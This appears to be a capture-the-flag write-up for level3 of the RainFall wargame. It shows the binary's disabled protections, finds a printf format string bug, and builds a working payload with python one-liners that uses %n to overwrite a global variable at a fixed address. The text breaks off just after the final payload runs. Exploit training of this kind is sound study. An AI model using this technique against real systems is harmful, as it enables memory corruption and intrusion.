```
 GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
```

This time we have a call to fgets, which is safe.

But right after a printf call, that directly uses the content of fgets as its format string (bad practice), and we can exploit that to change the value of the m global variable.

This variable can be found at address 0x804988c and needs to have  or 64 as value but is set as 0.

https://cs.boisestate.edu/~jhyeh/cs546/Format-String-Lecture.pdf

If we were able to choose our vaargs then we could impact them.
But printf doesn't care there isn't any vaargs

```
level3@RainFall:~$ ./level3
%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 bfff000a
```

In order for the exploit listed above to work, we need to pass the m address as a printf argument, take note of its index, and have a modifier for said argument that will change its value, it's %n that will write to the param that must be a point, the number of bytes written, in that case 64

```
~$ python -c 'print("AAAA%x " * 20)'| ./level3
AAAA 200AAAA b7fd1ac0AAAA b7ff37d0AAAA 41414141AAAA 41782520AAAA 20414141AAAA 41417825AAAA 25204141AAAA 41414178AAAA 78252041AAAA 41414141AAAA 41782520AAAA 20414141AAAA 41417825AAAA 25204141AAAA 41414178AAAA 78252041AAAA 41414141AAAA 41782520AAAA 20414141
```

We can find by seeing 41414141AAAA that our input string is the fourth argument to be picked up by printf.

\x8c\x98\x04\x08
```
level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08 %x %x%x%x")'| ./level3
� 200 b7fd1ac0 b7ff37d0 804988c
```
It does work indeed, so now we need to print 64 chars, and to help us with this, there a printf flag that specifies wich argument should be use, eg : `%4$s` prints the fourth arg as a string, and `%60d%4$s` adds 60 padding to it

```
level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%60d%4$n")'| ./level3
�                                                         512
Wait what?!
```
